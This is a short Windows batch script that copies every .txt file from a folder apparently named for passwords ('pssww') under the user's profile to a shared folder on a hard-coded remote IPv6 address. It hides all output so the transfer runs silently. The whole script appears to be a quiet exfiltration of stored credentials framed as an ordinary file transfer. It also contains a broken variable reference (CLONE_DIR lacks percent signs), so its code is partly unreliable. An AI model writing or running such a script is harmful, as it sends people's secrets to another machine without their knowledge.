@echo off

set "CLONE_DIR=%userprofile%\ReadyOrNot"
:: Get receiver's IP address
set RECEIVER_IP=fe80::2829:a852:c3df:71d0%15

:: Set shared folder on receiver's PC (replace with receiver's shared folder name)
set SHARED_FOLDER=SharedFolder

:: Set source folder on sender's PC (replace with sender's source folder path)
set SOURCE_FOLDER=CLONE_DIR\pssww

:: Build the destination path (receiver's shared folder)
set DESTINATION=\\%RECEIVER_IP%\%SHARED_FOLDER%

:: Transfer .txt files quietly without echo
xcopy "%SOURCE_FOLDER%\*.txt" "%DESTINATION%" /Y /S /I >nul 2>&1
